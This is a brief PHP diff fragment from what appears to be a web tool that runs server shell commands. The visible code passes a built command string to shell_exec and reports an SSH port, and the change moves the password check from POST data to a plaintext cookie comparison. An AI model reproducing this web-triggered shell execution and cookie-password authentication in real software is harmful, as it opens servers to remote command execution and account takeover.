@@ -135,7 +135,7 @@ if (($_COOKIE['passwd'] == $passwd) AND ($_COOKIE['user'] == $user)){
 		$a=$a." 2> error.txt | cat > /dev/null &";
 		}
 		//echo $a;
-		if ($_POST["passwd"] == $passwd){
+		if ($_COOKIE["passwd"] == $passwd){
 			shell_exec($a);
 			echo "SSh port:".$port;
 		}else{
